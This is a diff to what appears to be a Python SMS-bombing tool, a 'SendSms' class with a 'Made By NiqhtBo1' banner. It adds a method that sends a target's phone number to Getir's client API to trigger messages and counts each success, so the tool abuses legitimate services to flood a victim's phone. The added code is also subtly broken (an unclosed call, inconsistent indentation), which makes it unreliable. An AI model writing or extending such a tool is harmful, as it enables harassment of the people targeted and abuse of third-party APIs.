@@ -257,6 +257,16 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yuffi.co")
-            
+    #getir
+     def getir(self):
+        try:
+            wmf = requests.post("https://food-client-api-gateway.getirapi.com/clients/by-gsm/?countryCode=90&gsm=" + self.phone
+            if wmf.status_code == 202:
+                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> getir.com")
+                self.adet += 1   
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> getir.com")
 
   
